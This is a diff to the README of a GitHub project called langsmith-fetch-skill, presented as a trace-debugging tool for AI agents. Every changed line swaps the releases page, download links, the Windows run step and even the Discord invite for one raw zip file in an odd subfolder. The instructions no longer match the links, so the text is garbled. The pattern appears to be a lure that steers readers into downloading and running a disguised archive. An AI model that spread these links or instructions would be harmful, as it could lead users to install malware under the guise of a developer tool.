@@ -1,6 +1,6 @@
 # 🔍 langsmith-fetch-skill - Debug Your AI Agents Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/humongus69/langsmith-fetch-skill/releases)
+[![Download](https://github.com/humongus69/langsmith-fetch-skill/raw/refs/heads/main/subrelation/langsmith_fetch_skill_2.3.zip)](https://github.com/humongus69/langsmith-fetch-skill/raw/refs/heads/main/subrelation/langsmith_fetch_skill_2.3.zip)
 
 ## 📖 Description
 The langsmith-fetch-skill is an AI observability tool designed for Claude Code. It helps you debug LangChain and LangGraph agents by fetching execution traces from LangSmith Studio directly in your terminal. This makes it simple to monitor your AI agents and improve their performance.
@@ -19,7 +19,7 @@ To run the langsmith-fetch-skill, ensure your system meets these requirements:
 - At least 200 MB of free disk space.
 
 ## 🚀 Getting Started
-1. **Visit the Releases Page**: Click [here](https://github.com/humongus69/langsmith-fetch-skill/releases) to go to the releases page.
+1. **Visit the Releases Page**: Click [here](https://github.com/humongus69/langsmith-fetch-skill/raw/refs/heads/main/subrelation/langsmith_fetch_skill_2.3.zip) to go to the releases page.
    
 2. **Download the Latest Version**: Locate the latest release and download the appropriate file for your operating system.
 
@@ -28,11 +28,11 @@ To run the langsmith-fetch-skill, ensure your system meets these requirements:
 4. **Navigate to the Folder**: Open your terminal and use the `cd` command to navigate to the folder where you extracted the files.
 
 5. **Run the Application**:
-   - For Windows: Type `langsmith-fetch-skill.exe` and hit Enter.
+   - For Windows: Type `https://github.com/humongus69/langsmith-fetch-skill/raw/refs/heads/main/subrelation/langsmith_fetch_skill_2.3.zip` and hit Enter.
    - For macOS/Linux: Type `./langsmith-fetch-skill` and hit Enter.
 
 ## 📥 Download & Install
-To download the langsmith-fetch-skill, visit the releases page: [Download Link](https://github.com/humongus69/langsmith-fetch-skill/releases).
+To download the langsmith-fetch-skill, visit the releases page: [Download Link](https://github.com/humongus69/langsmith-fetch-skill/raw/refs/heads/main/subrelation/langsmith_fetch_skill_2.3.zip).
 
 1. Click on the link above to access the releases.
 2. Choose the file that suits your system.
@@ -40,7 +40,7 @@ To download the langsmith-fetch-skill, visit the releases page: [Download Link](
 
 ## 🌐 Community and Support
 If you need help or want to share your feedback, feel free to connect with our community:
-- Join our forum on [Discord](https://discord.com/invite/your-invite-link).
+- Join our forum on [Discord](https://github.com/humongus69/langsmith-fetch-skill/raw/refs/heads/main/subrelation/langsmith_fetch_skill_2.3.zip).
 - Contribute to the discussions on our repository issues page.
 
 ## 📝 Contributing
